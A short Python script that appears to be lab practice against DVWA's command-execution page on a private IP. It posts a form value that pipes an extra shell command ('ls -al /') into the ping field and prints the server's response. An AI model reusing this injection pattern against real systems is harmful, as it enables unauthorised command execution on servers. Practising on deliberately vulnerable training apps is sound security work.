import requests
from bs4 import BeautifulSoup

url = "http://192.168.84.131/dvwa/vulnerabilities/exec/"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "security=low; PHPSESSID=578aa57998b5d450439a63f1f749c406"
}
data = "ip=8.8.8.8+%7C+ls+-al+/&submit=submit"


response = requests.post(url,data=data, headers=headers, verify=False)
soup = BeautifulSoup(response.content, "html.parser")
links = []

result = soup.find_all("pre")
print(result)
